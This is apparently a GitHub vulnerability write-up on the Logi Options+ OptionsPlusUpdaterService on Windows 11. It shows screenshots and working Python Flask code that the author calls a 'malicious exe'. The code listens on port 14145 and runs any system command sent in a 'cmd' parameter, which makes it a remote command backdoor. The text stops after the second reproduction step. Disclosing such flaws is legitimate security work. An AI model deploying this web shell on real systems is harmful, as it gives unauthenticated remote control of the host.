# windows Logi OptionsPlus OptionsPlusUpdaterService is Vulnerable Services

test on windows 11 22000.1098   Logi Options+ 1.0.5155

#Vulnerability reproduction

The first step：open services.msc find OptionsPlusUpdaterService
![image](https://github.com/happy0717/windows-Logi-OptionsPlus-OptionsPlusUpdaterService-is-Vulnerable-Services/blob/main/pic1.png)

Step 2：Prepare a malicious program
![image](https://github.com/happy0717/windows-Logi-OptionsPlus-OptionsPlusUpdaterService-is-Vulnerable-Services/blob/main/pic2.png)
  from flask import Flask, request
  import os

  app = Flask(__name__)

  @app.route('/')
  def hello_world():
      r = request.args.getlist('cmd')  #Reception? cmd= parameter
      a=os.popen(r[0])  #Execute system commands
      l = a.read()
      return l  #return

  if __name__ == '__main__':
      app.run(host='0.0.0.0', port=14145, debug=True)  #Listen HTTP port 14145
      
I was useing python3 flask write a malicious exe .It can listenHTTP port 14145 and execute system commands.
